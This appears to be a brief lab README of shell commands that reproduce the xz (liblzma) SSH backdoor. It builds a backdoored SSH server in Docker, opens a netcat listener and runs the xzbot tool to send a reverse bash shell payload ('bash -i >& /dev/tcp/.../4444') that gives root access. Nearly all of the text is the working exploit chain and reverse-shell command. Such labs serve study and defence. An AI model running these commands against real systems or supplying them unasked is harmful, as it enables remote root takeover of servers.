# Run backdoor'd SSH server
docker build -t xz-backdoor-lab .
docker run -p 2222:2222 --platform linux/amd64 -it --rm xz-backdoor-lab

# Run netcat listener
nc -lv 4444 
# or nc -lvp 4444 

# Run xzbot
go install github.com/amlweems/xzbot@latest
~/go/bin/xzbot -addr localhost:2222 -cmd "bash -c 'bash -i >& /dev/tcp/host.docker.internal/4444 0>&1'"

# Netcat is root!
